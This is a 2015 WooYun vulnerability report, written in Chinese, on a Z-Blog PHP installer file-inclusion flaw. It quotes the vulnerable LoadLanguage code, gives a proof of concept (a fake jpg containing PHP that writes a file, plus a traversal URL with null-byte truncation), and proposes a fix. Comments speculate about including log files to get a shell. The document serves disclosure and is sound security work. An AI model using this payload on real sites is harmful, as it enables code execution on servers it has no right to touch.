{"id": 34159, "wybug_id": "wooyun-2015-098417", "wybug_title": "Z-blog前台无需登录包含漏洞一枚", "wybug_corp": "Z-Blog", "wybug_author": "′雨。", "wybug_date": "2015-02-27 14:59", "wybug_open_date": "2015-06-02 15:00", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向公众公开  简要描述： 听说这个是大厂商? -.- 前台无需登录包含漏洞, 大概翻了一下 没看到好像能上传图片的地方。没细看。 就这样了把。 详细说明：  http://www.zblogcn.com/zblogphp/  下载地址问题出现在zb_install/index.php中我还注意看了一下 安装完成后 是写的啥提示\n安装结果创建数据库!zblog连接数据库并创建数据表!创建并插入数据成功!保存设置,编译模板成功!\n提示的是这个 并没有提示用户要删除这个目录 而且也不会自动删除这个文件。所以基本都是存在的。\n<?php/** * Z-Blog with PHP * @author  * @copyright (C) RainbowSoft Studio * @version 2.0 2013-07-05 */ /** * 安装程序 * @param  * @return array */require '../zb_system/function/c_system_base.php';require '../zb_system/function/c_system_admin.php';header('Content-type: text/html; charset=utf-8');define('bingo','<span class=\"bingo\"></span>');define('error','<span class=\"error\"></span>');$zbloglang=&$zbp->option['ZC_BLOG_LANGUAGEPACK'];if(isset($_POST['zbloglang']))$zbloglang=$_POST['zbloglang'];$zbp->LoadLanguage('system','',$zbloglang);$zbp->LoadLanguage('zb_install','zb_install',$zbloglang);$zbp->option['ZC_BLOG_LANGUAGE'] = $zbp->lang ['lang'];$zblogstep=(int)GetVars('step');if($zblogstep==0)$zblogstep=1;if( ($zbp->option['ZC_DATABASE_TYPE']!=='') && ($zbp->option['ZC_YUN_SITE']=='') ){\t$zblogstep=0;}elseif( ($zbp->option['ZC_DATABASE_TYPE']) && ($zbp->option['ZC_YUN_SITE']) ){\tif($zbp->Config('system')->CountItem()>0)$zblogstep=0;}?>\n\n$zbloglang=&$zbp->option['ZC_BLOG_LANGUAGEPACK'];if(isset($_POST['zbloglang']))$zbloglang=$_POST['zbloglang'];$zbp->LoadLanguage('system','',$zbloglang);$zbp->LoadLanguage('zb_install','zb_install',$zbloglang);$zbp->option['ZC_BLOG_LANGUAGE'] = $zbp->lang ['lang'];\n其实漏洞就是出现在这里。\n因为这段代码是出现在判断是否安装了之前, 所以 就算安装了 我们也可以走到这里。。\n\n$zbloglang=&$zbp->option['ZC_BLOG_LANGUAGEPACK']; //首先定义zbloglangif(isset($_POST['zbloglang']))$zbloglang=$_POST['zbloglang'];//如果设置了post的 就用post传递来的做这变量了。 因为zblog防止sql注入都是通过在查询函数的时候 不采用拼接 所以他们也没对post转义 这样是注入少了 但是也造成了这里的漏洞。$zbp->LoadLanguage('system','',$zbloglang);//跟跟跟$zbp->LoadLanguage('zb_install','zb_install',$zbloglang);$zbp->option['ZC_BLOG_LANGUAGE'] = $zbp->lang ['lang'];\n\npublic function LoadLanguage($type,$id,$default=''){\t\tif($type=='system'){\t\t\tif($default=='')$default=$this->option['ZC_BLOG_LANGUAGEPACK'];\t\t\tif(is_readable($f=$this->path . 'zb_users/language/' . $default . '.php')){\t\t\t\t$this->lang = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t\t$default='zh-cn';\t\t\tif(is_readable($f=$this->path . 'zb_users/language/' . $default . '.php')){\t\t\t\t$this->lang = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t\t$default='en';\t\t\tif(is_readable($f=$this->path . 'zb_users/language/' . $default . '.php')){\t\t\t\t$this->lang = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t}elseif($type=='plugin' || $type=='theme'){\t\t\tif($default=='')$default=$this->option['ZC_BLOG_LANGUAGEPACK'];\t\t\tif(is_readable($f=$this->path . 'zb_users/'.$type.'/'.$id.'/language/' . $default . '.php')){\t\t\t\t$this->lang[$id] = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t\t$default='zh-cn';\t\t\tif(is_readable($f=$this->path . 'zb_users/'.$type.'/'.$id.'/language/' . $default . '.php')){\t\t\t\t$this->lang[$id] = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t\t$default='en';\t\t\tif(is_readable($f=$this->path . 'zb_users/'.$type.'/'.$id.'/language/' . $default . '.php')){\t\t\t\t$this->lang[$id] = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t}elseif($type!='' && $id!=''){\t\t\tif($default=='')$default=$this->option['ZC_BLOG_LANGUAGEPACK'];\t\t\tif(is_readable($f=$this->path . $type.'/language/' . $default . '.php')){\t\t\t\t$this->lang[$id] = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t\t$default='zh-cn';\t\t\tif(is_readable($f=$this->path . $type.'/language/' . $default . '.php')){\t\t\t\t$this->lang[$id] = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t\t$default='en';\t\t\tif(is_readable($f=$this->path . $type.'/language/' . $default . '.php')){\t\t\t\t$this->lang[$id] = require($f);\t\t\t\t$this->langpacklist[]=array($type,$id,$default);\t\t\t\treturn true;\t\t\t}\t\t}\t}\n看这函数就知道了 到处包含,虽然限制了必须为.php后缀的 但是因为没对POST转义 所以我们可以截断后面的.php咯。大概找了一下 没找到能够上传图片的地方 这里我就自己新建一个jpg了把。 来测试测试就好。新建一个 yu.jpg\n<?phpfputs(fopen('testx.php','w'),'<?php phpinfo();?>');\n$zbp->LoadLanguage('system','',$zbloglang);$zbp->LoadLanguage('zb_install','zb_install',$zbloglang);因为他这里load了两个 当满足第一个的时候第二个就不会满足 就会出错。所以我们直接fputs一个文件就行。在根目录下。\nhttp://web/small/zblog/zb_install/index.phpzbloglang=../../yu.jpg%00\n   漏洞证明：  \n\n   修复方案：  这里应该对post来的zbloglang进行限制in_array('en','zh' 之类的 限制只能包含那几个文件    版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-02 15:00 厂商回复：  最新状态： 2015-03-09：非常感谢！确认晚了，着手处理中。 2015-03-09：非常抱歉，由于邮箱出现问题导致我们发现漏洞的时候已经晚了，进而平台自动忽略了本漏洞。近日将联系乌云对邮箱进行修改，非常感谢您的帮助！漏洞补丁已下发，详见http://blog.zblogcn.com/2015/03/09/79/。  ", "replys": "漏洞评价：\n评论\n     2015-02-27 15:04 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  好厉害    \n     2015-02-27 15:09 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  社工管理员加友情链接然后把logo发给他！    \n     2015-02-27 15:50 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  雨神，我要给你生个猴子。。    \n     2015-02-28 08:40 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  恩 好新奇的挖洞地点对于这种逻辑顺序的洞我一直没感觉呢 学习了    \n     2015-03-09 18:37 |    \t\tZ-Blog(乌云厂商)\t\t \n  这个漏洞的利用价值似乎不太高，因为如果调用图片上传接口的会强制重命名，只有后台附件上传才会保存文件名。但是在这里显示出的对危险参数的检测才是不足之处。第二次犯这种错误（前次在ASP，同样是语言包） ，定当吸取教训。    \n     2015-03-09 18:45 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @Z-Blog 啥重命名？ zbloglang？ 有点没看懂你说的 我默认配置测试的啦。    \n     2015-03-09 21:48 |    \t\tZ-Blog(乌云厂商)\t\t \n  @′雨。 是说上传入口啦    \n     2015-04-16 12:35 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  厂商萌萌的啦    \n     2015-04-24 22:30 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  @′雨。  这个是大厂商吗？  包含access_log不行？    \n     2015-07-22 10:07 |    \t\t打酱油的小男孩 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 俺也来乌云看看)\t\t \n  请问现在厂商在LoadLanguage函数里面加了过滤：$default = str_replace(array('/','\\\\'),'',$default);这样能绕过包含吗？    \n     2015-08-21 22:40 |    \t\tzsx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | undefined)\t\t \n  @打酱油的小男孩 我记得我这里重写过了    \n     2015-09-25 07:34 |    \t\t你大爷在此 百无禁忌 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | Hello 各位小伙伴们 大家好 我是王尼玛)\t\t \n  我就想知道知道能不能包含错误日志来getshell    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}